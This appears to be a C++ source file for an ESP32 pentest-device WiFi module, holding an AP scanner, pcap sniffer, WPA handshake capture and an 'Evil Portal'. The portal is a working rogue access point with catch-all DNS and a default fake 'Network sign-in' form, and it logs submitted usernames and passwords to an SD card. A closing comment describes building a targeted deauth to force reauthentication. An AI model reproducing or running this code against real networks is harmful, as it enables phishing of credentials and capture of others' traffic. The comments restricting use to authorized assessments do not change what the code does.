#include "Wifi.h"
#include "../../core/ModuleRegistry.h"
#include "../../core/Display.h"
#include "../../core/Input.h"
#include "../../core/SdCard.h"
#include "../../core/Config.h"
#include "../../core/Logger.h"
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <FS.h>

// --- Promiscuous capture state (shared with the RX callback) ---------------
static volatile uint32_t g_frames = 0;
static volatile uint32_t g_eapol  = 0;
static File              g_pcap;
static bool              g_eapolOnly = false;

// libpcap global + record headers (little-endian), link type 105 = IEEE802.11.
static void pcapWriteGlobalHeader(File& f) {
    // Write fields explicitly to avoid endian/packing surprises.
    uint32_t magic = 0xa1b2c3d4; f.write((uint8_t*)&magic, 4);
    uint16_t vmaj = 2, vmin = 4;  f.write((uint8_t*)&vmaj, 2); f.write((uint8_t*)&vmin, 2);
    int32_t  tz = 0;              f.write((uint8_t*)&tz, 4);
    uint32_t sig = 0;            f.write((uint8_t*)&sig, 4);
    uint32_t snap = 65535;       f.write((uint8_t*)&snap, 4);
    uint32_t net = 105;          f.write((uint8_t*)&net, 4);
}
static void pcapWriteRecord(File& f, const uint8_t* data, uint32_t len) {
    uint32_t ts_sec  = millis() / 1000;
    uint32_t ts_usec = (millis() % 1000) * 1000;
    f.write((uint8_t*)&ts_sec, 4);
    f.write((uint8_t*)&ts_usec, 4);
    f.write((uint8_t*)&len, 4);     // incl_len
    f.write((uint8_t*)&len, 4);     // orig_len
    f.write(data, len);
}

// Detect an EAPOL frame by scanning for the LLC/SNAP header + 0x888E ethertype.
static bool isEapol(const uint8_t* p, uint32_t n) {
    static const uint8_t sig[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
    if (n < sizeof(sig)) return false;
    for (uint32_t i = 0; i + sizeof(sig) <= n && i < 64; ++i)
        if (memcmp(p + i, sig, sizeof(sig)) == 0) return true;
    return false;
}

// Runs in the WiFi task context (not an ISR), so plain SD writes are fine here.
static void promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type) {
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint32_t len = pkt->rx_ctrl.sig_len;
    if (len < 4 || len > 2000) return;
    const uint8_t* frame = pkt->payload;

    bool eapol = isEapol(frame, len);
    if (eapol) g_eapol++;
    g_frames++;

    if (g_pcap && (!g_eapolOnly || eapol))
        pcapWriteRecord(g_pcap, frame, len);
}

// --- Evil Portal state -----------------------------------------------------
static WebServer* g_web = nullptr;
static DNSServer* g_dns = nullptr;
static File       g_portalLog;
static String     g_portalTemplate;
static volatile uint32_t g_portalHits = 0;
static volatile uint32_t g_portalSubs = 0;

// ===========================================================================

void WifiModule::enter(Context& ctx) {
    view_ = View::Menu; menuSel_ = 0;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true);
    delay(80);
}

void WifiModule::exit(Context& ctx) {
    stopPromiscuous();
    stopPortal();
    WiFi.mode(WIFI_OFF);
}

bool WifiModule::loop(Context& ctx) {
    switch (view_) {
        case View::Menu:      break;
        case View::Scan:      return loopScan(ctx);
        case View::Sniffer:   return loopSniffer(ctx, /*eapolOnly=*/false);
        case View::Handshake: return loopSniffer(ctx, /*eapolOnly=*/true);
        case View::Portal:    return loopPortal(ctx);
    }

    static const char* items[] = {"Scan APs", "Sniffer (pcap)",
                                  "Handshake capture", "Evil Portal"};
    ctx.display->list(items, 4, menuSel_, "WiFi", "Enter=open  Esc=back");

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   menuSel_ = (menuSel_ + 3) % 4; break;
        case Key::Down: menuSel_ = (menuSel_ + 1) % 4; break;
        case Key::Back: return false;
        case Key::Enter:
            if (menuSel_ == 0)      { doScan(ctx); view_ = View::Scan; }
            else if (menuSel_ == 1) { if (startPromiscuous(ctx, false)) view_ = View::Sniffer; }
            else if (menuSel_ == 2) { if (startPromiscuous(ctx, true))  view_ = View::Handshake; }
            else if (menuSel_ == 3) { if (startPortal(ctx)) view_ = View::Portal; }
            break;
        default: break;
    }
    delay(10);
    return true;
}

// --- Scan ------------------------------------------------------------------
void WifiModule::doScan(Context& ctx) {
    ctx.display->clear(); ctx.display->header("WiFi Scan");
    ctx.display->line(0, "Scanning...", 0xFFE0);
    int n = WiFi.scanNetworks(false, true);
    aps_.clear(); scanSel_ = 0;
    for (int i = 0; i < n; ++i) {
        Ap ap; ap.ssid = WiFi.SSID(i); memcpy(ap.bssid, WiFi.BSSID(i), 6);
        ap.rssi = WiFi.RSSI(i); ap.ch = WiFi.channel(i); ap.enc = (uint8_t)WiFi.encryptionType(i);
        aps_.push_back(ap);
    }
    WiFi.scanDelete();
    if (ctx.log) ctx.log->info("WiFi scan: %d APs", (int)aps_.size());
}

bool WifiModule::loopScan(Context& ctx) {
    if (aps_.empty()) {
        ctx.display->clear(); ctx.display->header("WiFi Scan");
        ctx.display->line(0, "No APs. R=rescan", 0x8410);
        ctx.display->footer("Esc=back");
        KeyEvent e = ctx.input->poll();
        if (e.key == Key::Back) { view_ = View::Menu; }
        if (e.key == Key::Char && (e.ch=='r'||e.ch=='R')) doScan(ctx);
        delay(20); return true;
    }
    const Ap& a = aps_[scanSel_];
    ctx.display->clear(); ctx.display->header("WiFi Scan");
    ctx.display->printf(0, 0xFFFF, "%s", a.ssid.length()? a.ssid.c_str() : "<hidden>");
    ctx.display->printf(1, 0x8410, "%02X:%02X:%02X:%02X:%02X:%02X",
        a.bssid[0],a.bssid[1],a.bssid[2],a.bssid[3],a.bssid[4],a.bssid[5]);
    ctx.display->printf(2, 0x07E0, "ch %u  %ddBm  enc=%u", a.ch, (int)a.rssi, a.enc);
    ctx.display->printf(3, 0x8410, "%d/%d  Enter=set capture ch", scanSel_+1, (int)aps_.size());
    ctx.display->footer("Up/Down  R=rescan  Esc=back");

    KeyEvent e = ctx.input->poll();
    switch (e.key) {
        case Key::Up:   scanSel_ = (scanSel_ + aps_.size() - 1) % aps_.size(); break;
        case Key::Down: scanSel_ = (scanSel_ + 1) % aps_.size(); break;
        case Key::Enter: channel_ = a.ch;    // target channel for handshake capture
                         if (ctx.log) ctx.log->info("Capture channel set to %u", channel_);
                         break;
        case Key::Back: view_ = View::Menu; break;
        case Key::Char: if (e.ch=='r'||e.ch=='R') doScan(ctx); break;
        default: break;
    }
    delay(10); return true;
}

// --- Sniffer / Handshake (promiscuous) -------------------------------------
bool WifiModule::startPromiscuous(Context& ctx, bool eapolOnly) {
    g_frames = 0; g_eapol = 0; g_eapolOnly = eapolOnly;
    const char* prefix = eapolOnly ? "handshake" : "sniff";
    g_pcap = ctx.sd->openCapture(prefix, "pcap");
    if (g_pcap) pcapWriteGlobalHeader(g_pcap);

    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuousCb);
    esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    if (ctx.log) ctx.log->info("Promiscuous start (ch %u, %s)", channel_,
                               eapolOnly ? "EAPOL" : "all");
    return true;
}

void WifiModule::stopPromiscuous() {
    esp_wifi_set_promiscuous(false);
    if (g_pcap) { g_pcap.flush(); g_pcap.close(); }
}

bool WifiModule::loopSniffer(Context& ctx, bool eapolOnly) {
    // General sniffer hops channels; handshake capture stays on the target ch.
    static uint32_t lastHop = 0;
    if (!eapolOnly && millis() - lastHop > 350) {
        lastHop = millis();
        channel_ = (channel_ % 13) + 1;
        esp_wifi_set_channel(channel_, WIFI_SECOND_CHAN_NONE);
    }

    if (millis() - lastUiMs_ > 300) {
        lastUiMs_ = millis();
        ctx.display->clear();
        ctx.display->header(eapolOnly ? "Handshake capture" : "WiFi Sniffer");
        ctx.display->printf(0, 0xFFFF, "Frames: %lu", (unsigned long)g_frames);
        ctx.display->printf(1, 0x07E0, "EAPOL:  %lu", (unsigned long)g_eapol);
        ctx.display->printf(2, 0x8410, "Channel: %u", channel_);
        ctx.display->printf(3, 0x8410, "pcap: %s", g_pcap ? "writing" : "no SD");
        if (eapolOnly)
            ctx.display->line(4, "Waiting for a reauth...", 0x8410);
        ctx.display->footer("Esc=stop & save");
    }

    if (ctx.input->poll().key == Key::Back) {
        stopPromiscuous();
        if (ctx.log) ctx.log->info("Capture stopped: %lu frames, %lu EAPOL",
                                   (unsigned long)g_frames, (unsigned long)g_eapol);
        view_ = View::Menu;
    }
    return true;
}

// --- Evil Portal -----------------------------------------------------------
// Serves an operator-supplied HTML template from the SD card as a captive
// portal and logs submitted form fields to the SD card. The template is YOURS
// to provide (wifi.portal_template); the firmware ships no brand spoof. For
// authorized social-engineering assessments with written scope only.
static void portalHandleRoot() {
    g_portalHits++;
    g_web->send(200, "text/html", g_portalTemplate);
}
static void portalHandleSubmit() {
    g_portalSubs++;
    if (g_portalLog) {
        g_portalLog.printf("[%lu] submit", (unsigned long)millis());
        for (int i = 0; i < g_web->args(); ++i)
            g_portalLog.printf(" %s=%s", g_web->argName(i).c_str(), g_web->arg(i).c_str());
        g_portalLog.println();
        g_portalLog.flush();
    }
    g_web->send(200, "text/html",
        "<html><body>Thanks. Please wait...</body></html>");
}

bool WifiModule::startPortal(Context& ctx) {
    String ssid = ctx.config->getString("wifi.portal_ssid", "Free_WiFi");
    String tpl  = ctx.config->getString("wifi.portal_template", "/huginn/portal/index.html");

    g_portalTemplate = "";
    if (ctx.sd && ctx.sd->exists(tpl.c_str())) {
        File f = ctx.sd->fs().open(tpl.c_str(), FILE_READ);
        while (f && f.available()) g_portalTemplate += (char)f.read();
        if (f) f.close();
    }
    if (g_portalTemplate.length() == 0) {
        // Neutral default — a generic notice, not an impersonation of any brand.
        g_portalTemplate =
            "<html><head><meta name=viewport content='width=device-width'></head>"
            "<body><h3>Network sign-in</h3>"
            "<form method=POST action=/submit>"
            "User <input name=user><br>Pass <input name=pass type=password><br>"
            "<button>Connect</button></form></body></html>";
    }

    g_portalHits = 0; g_portalSubs = 0;
    g_portalLog = ctx.sd ? ctx.sd->openCapture("portal", "log") : File();

    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid.c_str());
    IPAddress ip = WiFi.softAPIP();

    g_dns = new DNSServer();
    g_dns->start(53, "*", ip);          // catch-all DNS -> portal

    g_web = new WebServer(80);
    g_web->on("/", portalHandleRoot);
    g_web->on("/submit", HTTP_POST, portalHandleSubmit);
    g_web->onNotFound(portalHandleRoot); // captive redirect
    g_web->begin();

    if (ctx.log) ctx.log->tx("wifi", "evil portal up: SSID='%s'", ssid.c_str());
    return true;
}

void WifiModule::stopPortal() {
    if (g_web) { g_web->stop(); delete g_web; g_web = nullptr; }
    if (g_dns) { g_dns->stop(); delete g_dns; g_dns = nullptr; }
    if (g_portalLog) { g_portalLog.flush(); g_portalLog.close(); }
    WiFi.softAPdisconnect(true);
}

bool WifiModule::loopPortal(Context& ctx) {
    if (g_dns) g_dns->processNextRequest();
    if (g_web) g_web->handleClient();

    if (millis() - lastUiMs_ > 400) {
        lastUiMs_ = millis();
        ctx.display->clear(); ctx.display->header("Evil Portal");
        ctx.display->printf(0, 0xFFFF, "SSID: %s",
            ctx.config->getString("wifi.portal_ssid", "Free_WiFi").c_str());
        ctx.display->printf(1, 0x07E0, "Page hits: %lu", (unsigned long)g_portalHits);
        ctx.display->printf(2, 0xFFE0, "Submissions: %lu", (unsigned long)g_portalSubs);
        ctx.display->line(4, "Logged to SD captures/", 0x8410);
        ctx.display->footer("Esc=stop");
    }

    if (ctx.input->poll().key == Key::Back) { stopPortal(); view_ = View::Menu; }
    return true;
}

REGISTER_MODULE(WifiModule);

// --- Deauth / jamming note --------------------------------------------------
// Active 802.11 deauthentication and RF jamming are denial-of-service actions
// against whatever is in range. They are deliberately NOT implemented here as a
// turnkey feature. If your authorized engagement requires forcing a reauth to
// capture a handshake, implement a TARGETED, bounded deauth against a single
// known BSSID/client you are scoped to test, keep it rate-limited, and log every
// frame via ctx.log->tx("wifi", ...). Do not ship an indiscriminate flood.
